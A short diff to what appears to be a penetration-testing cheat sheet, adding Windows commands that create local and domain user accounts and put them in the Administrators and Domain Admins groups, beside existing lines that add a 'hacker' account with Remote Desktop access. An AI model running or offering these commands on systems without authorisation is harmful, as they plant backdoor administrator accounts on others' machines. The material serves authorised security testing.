@@ -228,6 +228,16 @@ net user hacker Hacker123! /add
 net localgroup administrators hacker /add
 
 net localgroup "Remote Desktop Users" hacker /add
+
+
+
+# WINDOWS: Add domain user and put them in Domain Admins group
+net user username password /ADD /DOMAIN
+net group "Domain Admins" username /ADD /DOMAIN
+
+# WINDOWS: Add local user and put them local Administrators group
+net user username password /ADD
+net localgroup Administrators username /ADD
 ```
 ## Verify missing patch
 https://github.com/rasta-mouse/Sherlock.git
